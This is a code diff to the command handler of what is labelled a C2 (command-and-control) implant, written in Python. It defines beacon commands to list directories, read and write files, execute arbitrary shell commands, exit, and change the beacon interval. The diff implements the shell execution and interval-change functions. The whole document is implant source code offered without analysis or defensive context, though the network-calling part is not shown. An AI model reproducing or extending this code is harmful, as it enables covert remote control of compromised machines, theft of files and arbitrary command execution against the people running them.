@@ -7,14 +7,12 @@ class commands(Enum):
     """
     Listing of possible c2 commands
     """
-    DIR = 1
-    GET = 2
-    PUT = 3
-    EXEC = 4
-    DIE = 5
-    INTERVAL = 6
-    PLATFORM = 7
-    PLATFORMS = 8
+    DIR = 1 # Get dir contents
+    GET = 2 # Get file contents
+    PUT = 3 # Put file
+    EXE = 4 # Execute shell command
+    DIE = 5 # Exit program
+    INT = 6 # Set beacon interval
 
     @staticmethod
     def do_dir(dir):
@@ -61,11 +59,12 @@ class commands(Enum):
         return result
 
     @staticmethod
-    def do_exec(*argv):
+    def do_exec(cmd):
         """
-        Return an arbitrary shell command
+        Take in a list of strings representing command and args
+        Execute the command, then return results
         """
-        proc = subprocess.run(argv[:], capture_output=True)
+        proc = subprocess.run(cmd, capture_output=True)
         result = b""
         if proc.returncode != 0:
             result = proc.stderr
@@ -79,20 +78,10 @@ class commands(Enum):
         """
         Return a string verifying exit
         """
-        return "Exiting"
+        return b"Exiting"
 
     @staticmethod
-    def do_interval():
-        # TODO: Figure out how to update interval from this class
-        pass
+    def do_interval(core, new_interval):
+        core.interval = new_interval
+        return "Interval updated to {}".format(new_interval).encode()
 
-    @staticmethod
-    def do_platform():
-        # TODO: Figure out how to update platform from this class
-        pass
-    
-    @staticmethod
-    def do_platforms():
-        # TODO: Figure out how to print platforms from this class
-        # TODO: Also print current platform
-        pass
